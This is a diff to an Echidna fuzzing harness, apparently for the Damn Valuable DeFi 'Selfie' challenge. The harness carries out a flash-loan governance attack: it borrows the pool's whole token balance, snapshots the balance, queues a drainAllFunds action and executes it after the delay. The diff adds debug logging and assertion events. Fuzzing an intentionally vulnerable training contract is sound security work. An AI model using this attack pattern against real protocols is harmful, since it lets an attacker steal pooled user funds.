@@ -4,6 +4,7 @@ pragma solidity ^0.8.7;
 import "../SelfiePool.sol";
 import "../SimpleGovernance.sol";
 import "../../DamnValuableTokenSnapshot.sol";
+import "../../_helpers/Debugger.sol";
 
 /**
  * @notice to run echidna use following command:
@@ -48,19 +49,27 @@ contract EchidnaSelfie {
 
     address owner;
 
+    bool actionCanBeExecuted;
+    uint256 private queueActionTimestamp;
+
     SelfiePool pool;
     SimpleGovernance governance;
     DamnValuableTokenSnapshot token;
+
+    event AssertionFailed(string reason);
 
     constructor() payable {
         SelfieDeployment deployer;
         deployer = new SelfieDeployment();
         (pool, governance, token) = deployer.deployContracts();
         owner = msg.sender;
+        actionCanBeExecuted = false;
     }
 
     function flashLoan() public {
+        Debugger.log("flashloan...", 1);
         borrowAmount = token.balanceOf(address(pool));
+        Debugger.log("borrowAmount: ", borrowAmount);
         pool.flashLoan(borrowAmount);
     }
 
@@ -69,22 +78,43 @@ contract EchidnaSelfie {
             msg.sender == address(pool),
             "Only pool can call this function."
         );
-        lastSnapshot = token.snapshot();
+        token.snapshot();
         bytes memory payload = abi.encodeWithSignature(
             "drainAllFunds(address)",
             address(this)
         );
-        actionId = governance.queueAction(address(this), payload, 0);
+        actionId = governance.queueAction(address(pool), payload, 0);
+        queueActionTimestamp = block.timestamp;
         // repay the loan
         require(token.transfer(address(pool), _amount), "flash loan failed");
+        actionCanBeExecuted = true;
     }
 
     function executeAction() public {
+        Debugger.log("executeAction...", 1);
+        require(actionCanBeExecuted, "ActionId has not been set yet.");
         require(
-            block.timestamp >= lastSnapshot + ACTION_DELAY_IN_SECONDS,
+            block.timestamp >= queueActionTimestamp + ACTION_DELAY_IN_SECONDS,
             "Time for action execution has not passed yet"
         );
-        governance.executeAction(actionId);
+        uint256 _statment = block.timestamp >=
+            lastSnapshot + ACTION_DELAY_IN_SECONDS
+            ? 1
+            : 0;
+        try governance.executeAction(actionId) {
+            actionCanBeExecuted = false;
+        } catch {
+            Debugger.log("actionId", actionId);
+            Debugger.log("borrowAmount", borrowAmount);
+            Debugger.log("block.timestamp", block.timestamp);
+            Debugger.log(
+                "block.ACTION_DELAY_IN_SECONDS",
+                ACTION_DELAY_IN_SECONDS
+            );
+            Debugger.log("require statment", _statment);
+
+            emit AssertionFailed("governance.executeAction(actionId) failed");
+        }
     }
 
     ////////////////
